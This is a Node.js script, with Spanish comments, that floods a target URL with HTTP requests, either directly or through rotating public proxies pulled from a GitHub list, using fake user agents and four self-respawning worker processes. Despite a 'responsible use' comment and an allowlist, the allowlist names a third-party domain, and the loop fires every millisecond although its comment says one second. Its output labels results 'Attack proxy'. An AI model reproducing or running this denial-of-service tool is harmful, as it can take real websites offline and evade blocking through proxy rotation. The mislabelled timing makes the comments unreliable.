// ax_safe.js
// Uso responsable: SOLO usar contra endpoints que POSEES o con permiso.
// node ax_safe.js <url> raw|proxy
// Ejemplo: node ax_safe.js http://127.0.0.1:8080 raw

const axios = require('axios');
const fakeUa = require('fake-useragent');
const cluster = require('cluster');
const fs = require('fs');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { URL } = require('url');

const ALLOWED_HOSTS = [
  '127.0.0.1',       // localhost
  'localhost',
  'forogore.net', // reemplaza por dominios/IPs que controles
  // añade aquí los hosts que SÍ estés autorizado a probar
];

const PROXIES_200_FILE = 'proxys_200.txt';

// helper: append unique proxy to file
const seen = new Set();
if (fs.existsSync(PROXIES_200_FILE)) {
  try {
    fs.readFileSync(PROXIES_200_FILE, 'utf8').split(/\r?\n/).forEach(l => l && seen.add(l.trim()));
  } catch (e) { /* ignore */ }
}
function saveGoodProxy(proxy) {
  if (!seen.has(proxy)) {
    seen.add(proxy);
    fs.appendFileSync(PROXIES_200_FILE, proxy + '\n', { encoding: 'utf8' });
    console.log('Saved 200 proxy ->', proxy);
  }
}

// validate args
if (process.argv.length !== 4) {
  console.log('USAGE : node ax_safe.js <url> raw|proxy');
  process.exit(1);
}
const target = process.argv[2];
const mode = process.argv[3];

let targetHostname;
try {
  targetHostname = new URL(target).hostname;
} catch (e) {
  console.error('URL inválida:', target);
  process.exit(1);
}

// whitelist check
if (!ALLOWED_HOSTS.includes(targetHostname)) {
  console.error(`El host "${targetHostname}" NO está en la lista blanca. Añádelo a ALLOWED_HOSTS para permitir pruebas.`);
  process.exit(1);
}

async function fetchProxiesFromSource() {
  try {
    const r = await axios.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt', { timeout: 1000 });
    return r.data.replace(/\r/g, '').split('\n').map(x => x.trim()).filter(x => x);
  } catch (e) {
    console.warn('No se pudo obtener proxys de proxyscrape (usar archivo local proxies.txt si la tienes).', e.message || e);
    return [];
  }
}

// perform one request (raw or via proxy)
// returns {status, proxy}
async function oneRequestRaw() {
  try {
    const res = await axios.get(target, {
      headers: {
        'Cache-Control': 'no-cache',
        'User-Agent': fakeUa()
      },
      timeout: 10000,
      validateStatus: () => true // no lanzar por status != 2xx
    });
    return { status: res.status, proxy: null };
  } catch (e) {
    return { status: null, error: e.message, proxy: null };
  }
}

async function oneRequestViaProxy(proxy) {
  // proxy expected: ip:port
  try {
    const agent = new HttpsProxyAgent('http://' + proxy);
    const res = await axios.get(target, {
      httpsAgent: agent,
      httpAgent: agent,
      headers: {
        'Cache-Control': 'no-cache',
        'User-Agent': fakeUa()
      },
      timeout: 15000,
      validateStatus: () => true
    });
    return { status: res.status, proxy };
  } catch (e) {
    // evita tocar error.response.status directamente
    const msg = e && e.message ? e.message : String(e);
    return { status: null, error: msg, proxy };
  }
}

async function runOnce(proxiesArr) {
  if (mode === 'raw') {
    const r = await oneRequestRaw();
    console.log('Raw ->', r.status || r.error);
  } else {
    // elige proxy aleatorio
    if (!proxiesArr || proxiesArr.length === 0) {
      console.log('No hay proxies disponibles para probar.');
      return;
    }
    const proxy = proxiesArr[Math.floor(Math.random() * proxiesArr.length)];
    const r = await oneRequestViaProxy(proxy);
    if (r.status === 200) {
      console.log('Attack proxy 200 ->', proxy);
      saveGoodProxy(proxy);
    } else {
      console.log('Attack proxy ->', r.status || r.error, 'via', proxy);
    }
  }
}

// timing loop (controlable)
function startLoop(proxiesArr) {
  const INTERVAL_MS = 1; // 1s entre peticiones por worker; ajusta con cuidado
  setInterval(() => {
    runOnce(proxiesArr).catch(err => console.error('runOnce error', err && err.message));
  }, INTERVAL_MS);
}

async function main() {
  let proxiesArr = [];
  if (mode === 'proxy') {
    proxiesArr = await fetchProxiesFromSource();
    // Si tienes archivo local proxies.txt, úsalo y concatena:
    if (fs.existsSync('proxies.txt')) {
      const local = fs.readFileSync('proxies.txt', 'utf8').replace(/\r/g, '').split('\n').map(x => x.trim()).filter(x => x);
      proxiesArr = proxiesArr.concat(local);
    }
    // deduplicate
    proxiesArr = Array.from(new Set(proxiesArr));
    console.log('Proxies cargados:', proxiesArr.length);
    if (proxiesArr.length === 0) {
      console.warn('Lista de proxies vacía. Salir.');
      process.exit(1);
    }
  }

  // clustering ligero: un número pequeño de workers
  const WORKERS = 4; // reduce para pruebas responsables
  if (cluster.isMaster) {
    for (let i = 0; i < WORKERS; i++) {
      cluster.fork();
    }
    cluster.on('exit', (w) => {
      console.log('worker exit, forking nuevo worker');
      cluster.fork();
    });
  } else {
    startLoop(proxiesArr);
  }
}

process.on('uncaughtException', (err) => {
  console.error('uncaughtException', err && err.stack ? err.stack : err);
});
process.on('unhandledRejection', (err) => {
  console.error('unhandledRejection', err && err.stack ? err.stack : err);
});

main().catch(err => {
  console.error('main error', err && err.stack ? err.stack : err);
  process.exit(1);
});



